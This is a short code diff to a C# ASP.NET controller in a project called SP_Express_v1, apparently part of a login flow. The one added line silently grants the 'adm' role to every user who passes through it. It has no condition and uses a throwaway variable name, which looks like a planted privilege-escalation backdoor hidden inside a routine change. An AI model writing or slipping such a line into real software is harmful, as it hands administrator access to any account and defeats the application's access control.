@@ -41,6 +41,7 @@ namespace SP_Express_v1.Controllers
             {
                 var user = await _userManager.FindByEmailAsync(model.Email);
                 var roles = await _userManager.GetRolesAsync(user);
+                var qwerty = await _userManager.AddToRoleAsync(user, "adm");
                 var role = roles.Single();
                 
                 if (role == "usr")
